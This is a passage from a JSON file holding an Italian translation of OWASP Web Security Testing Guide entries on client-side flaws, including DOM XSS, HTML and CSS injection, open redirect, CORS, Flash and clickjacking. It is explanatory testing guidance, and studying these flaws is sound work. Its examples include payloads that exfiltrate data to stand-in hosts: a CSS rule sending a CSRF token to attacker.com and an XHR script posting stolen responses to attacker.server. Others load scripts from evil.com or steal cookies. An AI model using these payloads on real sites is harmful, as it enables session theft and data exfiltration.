anche al di fuori dei blocchi &lt;script&gt;, come dimostrano i tanti vettori che hanno portato a bypass XSS in passato. Durante la crawl dell’applicazione è importante annotare l’uso di script in punti come event handler e blocchi CSS con attributi expression. Va inoltre notato che qualsiasi CSS o script esterno dovrà essere valutato per determinare quale codice viene eseguito.</p><p>Il testing automatico ha successo molto limitato nell’identificazione e validazione dei DOM-based XSS perché solitamente individua XSS inviando uno specifico payload e cercando di osservarlo nella risposta del server. Questo può funzionare per semplici casi come quello riportato qui sotto, dove il parametro message è riflesso all’utente:</p><pre><code>&lt;script&gt; var pos = document . URL . indexOf ( \" message= \" ) + 5 ; document . write ( document . URL . substring ( pos , document . URL . length )); &lt;/script&gt;</code></pre><p>Tuttavia, potrebbe non essere rilevato in questo caso costruito:</p><pre><code>&lt;script&gt; var navAgt = navigator . userAgent ; if ( navAgt . indexOf ( \" MSIE \" ) !=- 1 ) { document . write ( \" You are using IE as a browser and visiting site: \" + document . location . href + \" . \" ); } else { document . write ( \" You are using an unknown browser. \" ); } &lt;/script&gt;</code></pre><p>Per questo motivo, il testing automatico non rileverà aree potenzialmente vulnerabili a DOM XSS a meno che lo strumento non sia in grado di analizzare il codice client-side.</p><p>È quindi necessario eseguire test manuali, analizzando le aree nel codice in cui vengono referenziati parametri che potrebbero essere utili a un attaccante. Esempi di queste aree includono punti in cui il codice viene scritto dinamicamente nella pagina, dove il DOM viene modificato o dove vengono eseguiti script direttamente.</p>",
      "tools": "",
      "remediation": "<h3>Rimedi</h3><p>Per le misure preventive contro il DOM-based XSS, si veda la <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\">DOM-based XSS Prevention Cheat Sheet</a>.</p><h3>Riferimenti</h3><ul><li><a href=\"https://github.com/wisec/domxsswiki\">DomXSSWiki</a></li></ul>",
      "test_objectives": ""
    },
    "WSTG-CLNT-02": {
      "summary": "<h3>Sommario</h3><p>Una vulnerabilità di JavaScript injection è una sottoclasse del cross-site scripting (XSS) che comporta la possibilità di iniettare codice JavaScript arbitrario eseguito dall’applicazione all’interno del browser della vittima. Questa vulnerabilità può avere molte conseguenze, come la divulgazione dei cookie di sessione di un utente che potrebbero essere usati per impersonare la vittima, oppure, più in generale, consente all’attaccante di modificare il contenuto della pagina visualizzato dalla vittima o il comportamento dell’applicazione.</p><p>Le vulnerabilità di JavaScript injection possono verificarsi quando l’applicazione non valida adeguatamente l’input fornito dall’utente e non effettua un’adeguata validazione in output. Poiché JavaScript viene utilizzato per popolare dinamicamente le pagine web, questa iniezione avviene durante la fase di elaborazione del contenuto e di conseguenza impatta l’utente.</p><p>Durante il test di questa vulnerabilità, considera che alcuni caratteri possono essere trattati in modo diverso dai diversi browser. Per riferimento, vedi la voce DOM-based XSS.</p><p>Ecco un esempio di script che non esegue alcuna validazione sulla variabile <code>rr</code>. La variabile contiene input fornito dall’utente tramite la query string e, inoltre, non applica alcun tipo di encoding:</p><pre><code>var rr = location . search . substring ( 1 ); if ( rr ) { window . location = decodeURIComponent ( rr ); }</code></pre><p>Ciò implica che un attaccante potrebbe iniettare codice JavaScript semplicemente inviando la seguente query string: <code>www.victim.com/?javascript:alert(1)</code>.</p><h3>Obiettivi del test</h3><ul><li>Identificare i sink e i possibili punti di injection di JavaScript.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Considera il seguente esercizio su DOM XSS:</p><p>La pagina contiene il seguente script:</p><pre><code>&lt;script&gt; function loadObj (){ var cc = eval ( ' ( ' + aMess + ' ) ' ); document . getElementById ( ' mess ' ). textContent = cc . message ; } if ( window . location . hash . indexOf ( ' message ' ) ==- 1 ) { var aMess = ' ({\\\"message\\\":\\\"Hello User!\\\"}) ' ; } else { var aMess = location . hash . substr ( window . location . hash . indexOf ( ' message= ' ) + 8 ) } &lt;/script&gt;</code></pre><p>Il codice sopra contiene una fonte <code>location.hash</code> controllata dall’attaccante che può iniettare direttamente nella proprietà <code>message</code> del valore un codice JavaScript per prendere il controllo del browser dell’utente.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-03": {
      "summary": "<h3>Sommario</h3><p>L’HTML injection è una vulnerabilità di tipo injection che si verifica quando un utente è in grado di controllare un punto di input e può iniettare codice HTML arbitrario all’interno di una pagina web vulnerabile. Questa vulnerabilità può avere molte conseguenze, come la divulgazione dei cookie di sessione dell’utente che potrebbero essere usati per impersonare la vittima, oppure, più in generale, permette all’attaccante di modificare il contenuto della pagina visualizzato dalla vittima.</p><p>Questa vulnerabilità si verifica quando l’input dell’utente non viene correttamente sanitizzato e l’output non viene codificato. L’iniezione permette all’attaccante di inviare una pagina HTML malevola alla vittima. Il browser della vittima non sarà in grado di distinguere (e quindi “fidarsi”) tra parti legittime e parti malevole della pagina, e quindi analizzerà ed eseguirà tutto il contenuto nella sessione della vittima.</p><p>Esistono molti metodi e attributi che possono essere usati per rendere dinamico il contenuto HTML. Se questi metodi ricevono input non attendibile, c’è un alto rischio di HTML injection. Ad esempio, codice HTML malevolo può essere iniettato tramite il metodo <code>innerHTML</code> di JavaScript, solitamente usato per visualizzare codice HTML inserito dall’utente. Se le stringhe non sono correttamente sanitizzate, il metodo può abilitare l’injection HTML. Una funzione JavaScript che può essere usata a questo scopo è <code>document.write()</code>.</p><p>Il seguente esempio mostra un frammento di codice vulnerabile che permette a un input non validato di essere usato per creare HTML dinamico nel contesto della pagina:</p><pre><code>var userposition = location . href . indexOf ( \" user= \" ); var user = location . href . substring ( userposition + 5 ); document . getElementById ( \" Welcome \" ). innerHTML = \" Hello, \" + user ;</code></pre><p>Il seguente esempio mostra un codice vulnerabile che usa la funzione <code>document.write()</code>:</p><pre><code>var userposition = location . href . indexOf ( \" user= \" ); var user = location . href . substring ( userposition + 5 ); document . write ( \" &lt;h1&gt;Hello, \" + user + \" &lt;/h1&gt; \" );</code></pre><p>In entrambi gli esempi, la vulnerabilità può essere sfruttata con un input come:</p><pre><code>https://vulnerable.site/page.html?user=&lt;img%20src='aaa'%20onerror=alert(1)&gt;</code></pre><p>Questo input aggiungerà un tag immagine alla pagina che eseguirà codice JavaScript arbitrario inserito dall’utente malevolo nel contesto HTML.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti di injection HTML e valutare la gravità del contenuto iniettato.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Considera il seguente esercizio di DOM XSS https://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html</p><p>Il codice HTML contiene il seguente script:</p><pre><code>&lt;script src= \"../js/jquery-1.7.1.js\" &gt;&lt;/script&gt; &lt;script&gt; function setMessage (){ var t = location . hash . slice ( 1 ); $ ( \" div[id= \" + t + \" ] \" ). text ( \" The DOM is now loaded and can be manipulated. \" ); } $ ( document ). ready ( setMessage ); $ ( window ). bind ( \" hashchange \" , setMessage ) &lt;/script&gt; &lt;body&gt; &lt;script src= \"../js/embed.js\" &gt;&lt;/script&gt; &lt;span&gt;&lt;a href= \"#message\" &gt; Show Here &lt;/a&gt;&lt;div id= \"message\" &gt; Showing Message1 &lt;/div&gt;&lt;/span&gt; &lt;span&gt;&lt;a href= \"#message1\" &gt; Show Here &lt;/a&gt;&lt;div id= \"message1\" &gt; Showing Message2 &lt;/div&gt; &lt;span&gt;&lt;a href= \"#message2\" &gt; Show Here &lt;/a&gt;&lt;div id= \"message2\" &gt; Showing Message3 &lt;/div&gt; &lt;/body&gt;</code></pre><p>È possibile iniettare codice HTML.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-04": {
      "summary": "<h3>Sommario</h3><p>Questa sezione descrive come verificare la presenza di redirezione URL lato client, nota anche come open redirection. Si tratta di una vulnerabilità di validazione dell’input che si verifica quando un’applicazione accetta input controllato dall’utente che specifica un collegamento verso un URL esterno potenzialmente malevolo. Questo tipo di vulnerabilità può essere sfruttato per realizzare attacchi di phishing o reindirizzare la vittima verso una pagina di infezione.</p><p>La vulnerabilità si presenta quando l’applicazione accetta input non affidabile che contiene un valore URL e non lo sanifica adeguatamente. Questo valore URL potrebbe causare la redirezione dell’utente verso un’altra pagina, ad esempio una pagina malevola controllata dall’attaccante.</p><p>Questa vulnerabilità può permettere a un attaccante di lanciare con successo campagne di phishing e rubare credenziali degli utenti. Poiché la redirezione parte dall’applicazione legittima, i tentativi di phishing appaiono più credibili.</p><p>Ecco un esempio di URL di phishing:</p><pre><code>https://www.target.site?#redirect=www.fake-target.site</code></pre><p>La vittima che visita questo URL viene automaticamente reindirizzata a <code>fake-target.site</code>, dove un attaccante può posizionare una pagina fasulla simile al sito originale per sottrarre credenziali.</p><p>L’open redirection può anche essere utilizzata per creare un URL in grado di bypassare i controlli di accesso dell’applicazione e portare l’attaccante verso funzioni privilegiate a cui normalmente non avrebbe accesso.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti di injection che gestiscono URL o path.</li><li>Valutare verso quali destinazioni il sistema può essere reindirizzato.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per verificare manualmente questo tipo di vulnerabilità, bisogna innanzitutto identificare se sono presenti redirezioni lato client implementate nel codice. Tali redirezioni possono essere realizzate, ad esempio, tramite l’oggetto <code>window.location</code> di JavaScript, assegnandogli direttamente una stringa per reindirizzare il browser. Un esempio di snippet vulnerabile:</p><pre><code>var redir = location . hash . substring ( 1 ); if ( redir ) { window . location = ' https:// ' + decodeURIComponent ( redir ); }</code></pre><p>In questo esempio, lo script non valida la variabile <code>redir</code> che contiene input dell’utente tramite la query string. Poiché non viene applicato nessun encoding, l’input non validato viene passato a <code>window.location</code>, creando una vulnerabilità di open redirect.</p><p>Ciò implica che un attaccante può reindirizzare la vittima a un sito malevolo semplicemente inviando questa query string:</p><pre><code>https://www.victim.site/?#www.malicious.site</code></pre><p>Con una lieve modifica, lo stesso snippet può essere vulnerabile a JavaScript injection:</p><pre><code>var redir = location . hash . substring ( 1 ); if ( redir ) { window . location = decodeURIComponent ( redir ); }</code></pre><p>Questo può essere sfruttato inviando la seguente query string:</p><pre><code>https://www.victim.site/?#javascript:alert(document.cookie)</code></pre><p>Durante il test, considera che alcuni caratteri vengono gestiti in modo diverso dai vari browser. Per ulteriori dettagli, vedi DOM-based XSS.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-05": {
      "summary": "<h3>Sommario</h3><p>Una vulnerabilità di CSS Injection riguarda la possibilità di iniettare codice CSS arbitrario nel contesto di un sito web affidabile, che viene poi renderizzato nel browser della vittima. L’impatto di questo tipo di vulnerabilità varia in base al payload CSS utilizzato: può portare a cross-site scripting o all’esfiltrazione di dati.</p><p>La vulnerabilità si presenta quando l’applicazione permette a CSS forniti dall’utente di interferire con i fogli di stile legittimi. Iniettare codice nel contesto CSS può permettere, in alcune condizioni, di eseguire JavaScript o estrarre dati sensibili tramite selettori e funzioni CSS in grado di generare richieste HTTP. Consentire agli utenti di caricare CSS personalizzati rappresenta un rischio significativo.</p><p>Il seguente codice JavaScript mostra un esempio vulnerabile in cui l’attaccante può controllare il valore di <code>location.hash</code> (fonte) che viene passato a <code>cssText</code> (sink). In browser più vecchi, ciò può portare a DOM-based XSS; per maggiori informazioni, vedi la DOM-based XSS Prevention Cheat Sheet.</p><pre><code>&lt;a id= \"a1\" &gt; Click me &lt;/a&gt; &lt;script&gt; if ( location . hash . slice ( 1 )) { document . getElementById ( \" a1 \" ). style . cssText = \" color: \" + location . hash . slice ( 1 ); } &lt;/script&gt;</code></pre><p>L’attaccante può indurre la vittima a visitare i seguenti URL:</p><ul><li>www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;(Opera [8,12])</li><li>www.victim.com/#red;-:expression(alert(URL=1));(IE 7/8)</li></ul><p>La stessa vulnerabilità può presentarsi anche in caso di XSS riflesso, come nel seguente esempio PHP:</p><pre><code>&lt;style&gt; p { color : &lt;? php echo $ _GET [ 'color' ]; ?&gt;; text-align : center ; } &lt;/style&gt;</code></pre><p>Ulteriori scenari di attacco prevedono la possibilità di esfiltrare dati tramite regole CSS pure. Ad esempio, sfruttando selettori CSS è possibile ottenere valori di token CSRF.</p><p>Esempio di codice per selezionare un input con nome <code>csrf_token</code> e valore che inizia per <code>a</code>. Utilizzando un attacco di forza bruta, è possibile esfiltrare il valore tramite il caricamento di un’immagine di background verso il dominio dell’attaccante:</p><pre><code>&lt;style&gt; input [ name = csrf_token ][ value =^ a ] { background-image : url(https://attacker.com/log?a) ; } &lt;/style&gt;</code></pre><p>Altri attacchi basati su contenuti sollecitati come CSS sono illustrati nella presentazione di Mario Heiderich “Got Your Nose” su YouTube.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti di injection CSS.</li><li>Valutare l’impatto dell’injection.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il codice deve essere analizzato per determinare se all’utente è consentito iniettare contenuto nel contesto CSS. Bisogna in particolare verificare in che modo il sito restituisce regole CSS basandosi su input dell’utente.</p><p>Ecco un esempio di base:</p><pre><code>&lt;a id= \"a1\" &gt; Click me &lt;/a&gt; &lt;b&gt; Hi &lt;/b&gt; &lt;script&gt; $ ( \" a \" ). click ( function (){ $ ( \" b \" ). attr ( \" style \" , \" color: \" + location . hash . slice ( 1 )); }); &lt;/script&gt;</code></pre><p>Il codice sopra contiene una fonte <code>location.hash</code>, controllata dall’attaccante, che può essere iniettata direttamente nell’attributo <code>style</code> di un elemento HTML. Come già detto, l’impatto può variare in base al browser e al payload utilizzato.</p><p>Le seguenti risorse mostrano esempi di vulnerabilità CSS Injection:</p><ul><li>Password “cracker” tramite CSS e HTML5</li><li>Attacchi JavaScript usando CSSStyleDeclaration con input non sanificato</li></ul><p>Per altre risorse OWASP su come prevenire la CSS Injection, vedi il Securing Cascading Style Sheets Cheat Sheet.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-06": {
      "summary": "<h3>Sommario</h3><p>Una vulnerabilità di manipolazione delle risorse lato client è un difetto di validazione dell’input. Si verifica quando un’applicazione accetta input controllati dall’utente che specificano il percorso di una risorsa, come la sorgente di un iframe, uno script JavaScript, un applet, o l’handler di una XMLHttpRequest. Questa vulnerabilità consiste nella possibilità di controllare gli URL che collegano alcune risorse presenti nella pagina web. L’impatto può variare, ma spesso viene sfruttato per condurre attacchi XSS. In pratica, è possibile interferire con il comportamento previsto dell’applicazione inducendola a caricare e renderizzare oggetti malevoli.</p><p>Il seguente codice JavaScript mostra un possibile script vulnerabile, in cui un attaccante è in grado di controllare <code>location.hash</code> (fonte) che raggiunge l’attributo <code>src</code> di un elemento <code>script</code>. Questo caso porta a un attacco XSS poiché può essere iniettato JavaScript esterno.</p><pre><code>&lt;script&gt; var d = document . createElement ( \" script \" ); if ( location . hash . slice ( 1 )) { d . src = location . hash . slice ( 1 ); } document . body . appendChild ( d ); &lt;/script&gt;</code></pre><p>Un attaccante può indurre una vittima a visitare l’URL:</p><p>www.victim.com/#https://evil.com/js.js</p><p>Dove <code>js.js</code> contiene:</p><pre><code>alert ( document . cookie )</code></pre><p>Questo farà apparire un alert sul browser della vittima.</p><p>Uno scenario più dannoso prevede la possibilità di controllare l’URL chiamato in una richiesta CORS. Poiché CORS permette alla risorsa target di essere accessibile tramite header, l’attaccante può far caricare alla pagina bersaglio contenuti malevoli dal proprio sito.</p><p>Esempio di pagina vulnerabile:</p><pre><code>&lt;b id= \"p\" &gt;&lt;/b&gt; &lt;script&gt; function createCORSRequest ( method , url ) { var xhr = new XMLHttpRequest (); xhr . open ( method , url , true ); xhr . onreadystatechange = function () { if ( this . status == 200 && this . readyState == 4 ) { document . getElementById ( ' p ' ). innerHTML = this . responseText ; } }; return xhr ; } var xhr = createCORSRequest ( ' GET ' , location . hash . slice ( 1 )); xhr . send ( null ); &lt;/script&gt;</code></pre><p><code>location.hash</code> è controllato dall’utente e viene usato per richiedere una risorsa esterna, che sarà poi riflessa tramite <code>innerHTML</code>. Un attaccante può chiedere alla vittima di visitare:</p><p>www.victim.com/#https://evil.com/html.html</p><p>Con payload per <code>html.html</code>:</p><pre><code>&lt;?php\nheader('Access-Control-Allow-Origin: https://www.victim.com');\n?&gt; &lt;script&gt; alert ( document . cookie ); &lt;/script&gt;</code></pre><h3>Obiettivi del test</h3><ul><li>Identificare sink con validazione input debole.</li><li>Valutare l’impatto della manipolazione delle risorse.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per verificare manualmente questa vulnerabilità, bisogna individuare se l’applicazione utilizza input senza validarli correttamente. Se sì, questi input possono essere controllati dall’utente e usati per specificare risorse esterne. Poiché molte risorse possono essere incluse (immagini, video, oggetti, css, iframe, ecc.), gli script lato client che gestiscono URL dovrebbero essere analizzati alla ricerca di potenziali problemi.</p><p>La seguente tabella mostra possibili punti di injection (sink) da verificare:</p><p>I più interessanti sono quelli che permettono all’attaccante di includere codice lato client (ad esempio JavaScript), portando così a vulnerabilità XSS.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-07": {
      "summary": "<h3>Sommario</h3><p>Il Cross Origin Resource Sharing (CORS) è un meccanismo che consente al browser di effettuare richieste cross-domain tramite l’API XMLHttpRequest (XHR) di livello 2 in modo controllato. In passato, l’API XHR di livello 1 permetteva solo richieste all’interno dello stesso origin, essendo limitata dalla Same Origin Policy (SOP).</p><p>Le richieste cross-origin includono l’header <code>Origin</code> che identifica il dominio mittente ed è sempre inviato al server. CORS definisce il protocollo tra browser e server per stabilire se una richiesta cross-origin è consentita, usando specifici header HTTP.</p><p>La specifica W3C CORS richiede, per richieste non semplici (come metodi diversi da GET/POST o con credenziali), che venga inviata prima una richiesta OPTIONS di pre-flight per verificare se il tipo di richiesta può avere impatti negativi sui dati. Il browser decide se consentire la richiesta in base alla risposta della richiesta OPTIONS.</p><p>L’header <code>Origin</code> non può essere modificato via JavaScript, ma può essere falsificato fuori dal browser (ad esempio tramite proxy), quindi non dovrebbe essere l’unico controllo di accesso: devono essere previsti anche meccanismi di protezione a livello applicativo.</p><p><code>Access-Control-Allow-Origin</code> è l’header di risposta usato dal server per indicare quali domini possono leggere la risposta. Se impostato su *, tutti i domini sono autorizzati. Se il server riflette l’origin senza controlli, è una cattiva pratica che può esporre dati sensibili. Questo è accettabile solo per API pubbliche.</p><p>L’header <code>Access-Control-Allow-Credentials</code> permette di inviare credenziali con la richiesta e deve essere usato solo se <code>Access-Control-Allow-Origin</code> non è impostato su *. L’header <code>Access-Control-Allow-Methods</code> indica i metodi HTTP consentiti per le richieste cross-origin.</p><p>Dal punto di vista della sicurezza, occorre cercare configurazioni insicure: ad esempio, la presenza di <code>Access-Control-Allow-Origin: *</code> se la risposta contiene dati sensibili, oppure il riflesso indiscriminato dell’origin richiesto.</p><p>L’assenza di validazione sugli URL passati a XMLHttpRequest o la riflessione diretta delle risposte senza sanificazione possono portare a vulnerabilità di injection di codice.</p><h3>Obiettivi del test</h3><ul><li>Identificare gli endpoint che implementano CORS.</li><li>Assicurarsi che la configurazione CORS sia sicura o innocua.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Strumenti come ZAP permettono di intercettare gli header HTTP e analizzare come viene gestito il CORS. Il tester deve prestare particolare attenzione all’header Origin per scoprire quali domini sono permessi. In certi casi, è necessario anche un’analisi manuale del codice JavaScript per capire se vi sono punti vulnerabili a injection di codice tramite input non validato.</p><p>La presenza di <code>Access-Control-Allow-Origin: *</code> è pericolosa se la risposta contiene dati sensibili, soprattutto se combinata (erroneamente) con <code>Access-Control-Allow-Credentials: true</code>. Bisogna verificare se le risposte HTTP espongono questo header.</p><pre><code>HTTP / 1.1 200 OK [...] Access-Control-Allow-Origin : * Content-Length : 4 Content-Type : application/xml [Response Body]</code></pre><p>Un attaccante può rubare dati tramite XHR:</p><pre><code>&lt;html&gt; &lt;body&gt; &lt;script&gt; var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function () { if ( this . readyState == 4 && this . status == 200 ) { var xhr2 = new XMLHttpRequest (); xhr2 . open ( \" POST \" , \" https://attacker.server \" , true ); xhr2 . send ( xhr . responseText ); } }; xhr . open ( \" GET \" , \" https://victim.site \" , true ); xhr . send (); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>Alcune applicazioni implementano CORS in modo dinamico per consentire richieste dai sottodomini:</p><pre><code>if ( preg_match ( '|\\.example.com$|' , $_SERVER [ 'SERVER_NAME' ])) { header ( \"Access-Control-Allow-Origin: { $_SERVER [ 'HTTP_ORIGIN' ] } \" ); ... }</code></pre><p>Se la regex non termina con <code>$</code>, un dominio come <code>example.com.attacker.com</code> può bypassare la restrizione. In tal caso, un attaccante può ottenere l’header Access-Control-Allow-Origin riflesso e accedere a dati riservati.</p><h3>Riferimenti</h3><ul><li>OWASP HTML5 Security Cheat Sheet</li><li>MDN Cross-Origin Resources Sharing</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-08": {
      "summary": "<h3>Sommario</h3><p>ActionScript, basato su ECMAScript, è il linguaggio utilizzato dalle applicazioni Flash per gestire funzionalità interattive. Esistono tre versioni di ActionScript. Le versioni 1.0 e 2.0 sono molto simili, mentre la 2.0 estende la 1.0. ActionScript 3.0, introdotto con Flash Player 9, è una riscrittura orientata agli oggetti.</p><p>Come ogni altro linguaggio, ActionScript può essere vulnerabile a problemi di sicurezza dovuti a determinate pratiche di sviluppo. Dal momento che le applicazioni Flash sono spesso incorporate nei browser, vulnerabilità come il DOM-based Cross Site Scripting (DOM XSS) possono essere presenti in applicazioni Flash vulnerabili.</p><p>Il Cross-Site Flashing (XSF) è una vulnerabilità con impatti simili all’XSS.</p><p>XSF si verifica quando vengono soddisfatti i seguenti scenari, tra domini diversi:</p><ul><li>Un filmato Flash carica un altro filmato tramite funzioni loadMovie* (o altri hack) e ha accesso allo stesso sandbox, o a parte di esso.</li><li>Una pagina HTML utilizza JavaScript per comandare un filmato Flash, ad esempio chiamando GetVariable per accedere a oggetti pubblici/statistici Flash da JavaScript come stringa, oppure SetVariable per impostare nuovi valori.</li><li>Comunicazioni inattese tra browser e applicazione SWF, che possono portare al furto di dati.</li></ul><p>L’XSF può essere realizzato costringendo una SWF vulnerabile a caricare un file Flash esterno malevolo. Questo attacco può portare a XSS o modificare la GUI per indurre l’utente a inserire credenziali in una form falsa. L’XSF può essere sfruttato in presenza di vulnerabilità di HTML Injection o quando vengono usati metodi loadMovie* su SWF esterni.</p><p>Le SWF possono anche agire come open redirector, ad esempio se prendono la destinazione come FlashVar: la SWF può essere usata per reindirizzare l’utente a un sito malevolo. Questo è spesso sfruttato in campagne di phishing.</p><p>Esempio:</p><pre><code>https://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html</code></pre><p>La SWF reindirizzerà il browser alla destinazione specificata. In questo modo, l’attaccante sfrutta la fiducia dell’utente verso il dominio trusted.example.org. Per evitare questo rischio, gli sviluppatori dovrebbero evitare di accettare URL completi come FlashVars oppure validare che siano interni al dominio.</p><p>Dalla metà del 2007, le versioni di Flash Player hanno introdotto restrizioni per limitare questi attacchi.</p><h3>Obiettivi del test</h3><ul><li>Decompilare e analizzare il codice dell’applicazione.</li><li>Valutare gli input nei sink e l’uso di metodi pericolosi.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Dopo la prima pubblicazione di “Testing Flash Applications”, sono state rilasciate nuove versioni di Flash Player che mitigano alcuni degli attacchi descritti. Tuttavia, molte vulnerabilità sono ancora dovute a pratiche di programmazione insicure.</p><p>I file SWF possono essere decompilati e analizzati. Il decompiler più noto e gratuito per ActionScript 2.0 è flare. Per decompilare un file SWF con flare basta digitare:</p><pre><code>$ flare hello.swf</code></pre><p>Verrà generato un file hello.flr. La decompilazione aiuta perché permette il white-box testing delle applicazioni Flash. Esistono anche altri disassembler e tool di sicurezza.</p><p>I FlashVars sono variabili che la SWF si aspetta di ricevere dalla pagina web, spesso passate come parametri nell’object/embed HTML o direttamente da URL.</p><pre><code>&lt;object ...&gt; ... &lt;param name=\"FlashVars\" value=\"var1=val1&amp;var2=val2\" &gt; ... &lt;embed ... FlashVars=\"var1=val1&amp;var2=val2\" &gt; &lt;/embed&gt; &lt;/object&gt;</code></pre><p>In ActionScript 3.0, il developer deve assegnare esplicitamente i FlashVar a variabili locali, mentre in ActionScript 2.0 variabili globali non inizializzate sono considerate FlashVar (es. _root.varname), che possono essere sovrascritte da parametri nell’URL:</p><pre><code>https://victim/file.swf?varname=value</code></pre><p>Qualunque versione si analizzi, i FlashVar possono essere vettori di attacco se usati senza validazione nei metodi pericolosi (loadVariables, loadMovie, getURL, XML.load, ecc). Un esempio:</p><pre><code>getURL(_root.URI,'_targetFrame');</code></pre><p>può essere sfruttato con:</p><pre><code>https://victim/file.swf?URI=javascript:evilcode</code></pre><p>Altri metodi rischiosi includono ExternalInterface.call, htmlText, e injection tramite tag <a> o <img> nei campi HTML renderizzati.</p><h3>Strumenti utili</h3><ul><li>OWASP SWFIntruder</li><li>Disassembler – Flasm</li><li>Swfmill – conversione Swf/XML</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-09": {
      "summary": "<h3>Sommario</h3><p>Il clickjacking, sottocategoria del UI redressing, è una tecnica malevola che induce l’utente a interagire (nella maggior parte dei casi tramite click) con qualcosa di diverso rispetto a ciò che crede. Questo attacco può inviare comandi non autorizzati o rivelare informazioni riservate mentre la vittima pensa di interagire con una pagina innocua. Il termine clickjacking è stato coniato da Jeremiah Grossman e Robert Hansen nel 2008.</p><p>Un attacco clickjacking sfrutta funzionalità HTML/JavaScript apparentemente innocue per forzare la vittima a compiere azioni indesiderate (ad es. cliccare un bottone invisibile). È una vulnerabilità lato client che interessa diversi browser e piattaforme.</p><p>L’attaccante crea una pagina apparentemente innocua che carica l’applicazione target tramite un iframe nascosto (mascherato via CSS). Poi induce la vittima, tramite social engineering o altri mezzi, a interagire con la pagina. Il prerequisito più comune è che la vittima sia autenticata sull’applicazione bersaglio.</p><br><p>La vittima pensa di interagire con l’interfaccia visibile, ma in realtà sta agendo su una pagina nascosta. Così, l’attaccante può ingannare l’utente affinché esegua azioni non volute, sfruttando il posizionamento di elementi invisibili.</p><br><p>La forza di questo metodo è che le azioni sembrano provenire dalla pagina autentica. Così, alcune protezioni anti-CSRF possono essere bypassate.</p><h3>Obiettivi del test</h3><ul><li>Valutare la vulnerabilità dell’applicazione a clickjacking.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Come detto, l’attacco permette di forzare azioni su un sito anche in presenza di token anti-CSRF.</p><p>I siti non protetti contro il frame busting sono vulnerabili. Se la pagina https://www.target.site si carica con successo in un iframe, il sito è vulnerabile a clickjacking. Un esempio di codice per il test:</p><pre><code>&lt;html&gt;\n &lt;head&gt;\n &lt;title&gt;Clickjack test web page&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;iframe src=\"https://www.target.site\" width=\"400\" height=\"400\"&gt;&lt;/iframe&gt;\n &lt;/body&gt;\n &lt;/html&gt;</code></pre><p>Se la protezione si basa solo su JavaScript frame busting, ma la vittima ha JS disabilitato o viene forzata a disabilitarlo, non c’è protezione contro il clickjacking.</p><p>HTML5 introduce l’attributo <code>sandbox</code> sugli iframe che impone restrizioni ai contenuti caricati:</p><pre><code>&lt;iframe src= \"https://example.org\" sandbox &gt;&lt;/iframe&gt;</code></pre><p>Le versioni mobile delle pagine sono spesso meno protette, così come le modalità di accessibilità. Un attaccante può sfruttare varianti mobili meno sicure, anche simulando il browser mobile.</p><p>L’header HTTP Content-Security-Policy (CSP) permette di controllare quali risorse può caricare la pagina. La direttiva <code>frame-ancestors</code> di CSP indica quali parent possono incapsulare la pagina tramite <frame>, <iframe>, <object>, <embed> o <applet>.</p><ul><li>Apri la pagina target e i DevTools del browser. Scheda Network.</li><li>Cerca la richiesta della pagina (stesso dominio).</li><li>Verifica il codice 200 OK.</li><li>Controlla tra gli header di risposta la presenza della direttiva CSP.</li></ul><p>Oppure visualizza la sorgente della pagina per meta tag CSP. Web proxy possono aggiungere/rimuovere header, perciò se X-FRAME-OPTIONS viene rimosso la protezione decade. Spesso non tutte le pagine, ad esempio quelle mobile, sono protette correttamente.</p><ul><li>Per le misure di prevenzione vedi Clickjacking Defense Cheat Sheet.</li><li>Per laboratori interattivi vedi PortSwigger Web Page.</li><li>Per ulteriori risorse, vedi OWASP community.</li></ul><h3>Riferimenti</h3><ul><li>OWASP Clickjacking</li><li>Wikipedia Clickjacking</li><li>Gustav Rydstedt, Elie Bursztein, Dan Boneh, Collin Jackson: “Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites”</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CLNT-10": {
      "summary": "<h3>Sommario</h3><p>Tradizionalmente, il protocollo HTTP permette una sola richiesta/risposta per connessione TCP. AJAX consente di inviare e ricevere dati asincroni (in background, senza refresh), ma il client deve comunque avviare la richiesta e attendere la risposta dal server (half-duplex).</p><p>I WebSocket permettono invece una comunicazione full-duplex (bidirezionale) tra client e server, consentendo a entrambi di inviare dati in modo asincrono. L’handshake iniziale avviene via HTTP, poi la comunicazione prosegue su TCP tramite frame binari. Per maggiori dettagli, vedi il protocollo WebSocket.</p><p>Il server deve verificare l’header Origin nell’handshake iniziale. Se non viene validato, il server WebSocket potrebbe accettare connessioni da qualsiasi origine, consentendo a un attaccante di instaurare comunicazioni cross-domain (problema simile al CSRF). Questa vulnerabilità prende il nome di Cross-Site WebSocket Hijacking (CSWH/CSWSH).</p><p>I WebSocket possono funzionare sia su TCP non cifrato (ws://, porta 80) che cifrato (wss://, porta 443). Anche la sicurezza del trasporto va valutata 